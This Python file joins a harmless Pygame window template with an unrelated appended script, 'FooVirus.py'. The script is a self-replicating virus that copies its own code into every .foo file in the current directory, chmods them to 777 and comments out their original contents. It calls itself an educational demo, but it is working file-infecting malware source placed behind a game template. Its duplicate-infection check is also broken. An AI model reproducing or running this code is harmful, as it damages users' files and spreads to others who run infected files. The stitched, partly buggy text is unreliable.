"""
 Pygame base template for opening a window
 
 Sample Python/Pygame Programs
 Simpson College Computer Science
 http://programarcadegames.com/
 http://simpson.edu/computer-science/
 
 Explanation video: http://youtu.be/vRB_983kUMc
"""
 
import pygame
 
# Define some colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
 
pygame.init()
 
# Set the width and height of the screen [width, height]
size = (700, 500)
screen = pygame.display.set_mode(size)
 
pygame.display.set_caption("My Game")
 
# Loop until the user clicks the close button.
done = False
 
# Used to manage how fast the screen updates
clock = pygame.time.Clock()
 
# -------- Main Program Loop -----------
while not done:
    # --- Main event loop
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            done = True
 
    # --- Game logic should go here
 
    # --- Screen-clearing code goes here
 
    # Here, we clear the screen to white. Don't put other drawing commands
    # above this, or they will be erased with this command.
 
    # If you want a background image, replace this clear with blit'ing the
    # background image.
    screen.fill(WHITE)
 
    # --- Drawing code should go here
 
    # --- Go ahead and update the screen with what we've drawn.
    pygame.display.flip()
 
    # --- Limit to 60 frames per second
    clock.tick(60)
 
# Close the window and quit.
pygame.quit()

#!/usr/local/bin/python3
import sys
import os
import glob
## FooVirus.py
print("\nHELLO FROM FooVirus\n")
print("This is a demonstration of how easy it is to write")
print("a self-replicating program. This virus will infect")
print("all files with names ending in .foo in the directory in")
print("which you execute an infected file. If you send an")
print("infected file to someone else and they execute it, their,")
print(".foo files will be damaged also.\n")
print("Note that this is a safe virus (for educational purposes")
print("only) since it does not carry a harmful payload. All it")
print("does is to print out this message and comment out the")
print("code in .foo files.\n")
 
IN = open(sys.argv[0], "r")
virus = [line for (i,line) in enumerate(IN) if i < 37]
 
for item in glob.glob("*.foo"):
    IN = open(item, "r")
    all_of_it = IN.readlines()
    IN.close()
    if any(line.find("foovirus") for line in all_of_it): next
    os.chmod(item, 0o777)
    OUT = open(item, "w")
    OUT.writelines(virus)
    all_of_it = ["#" + line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()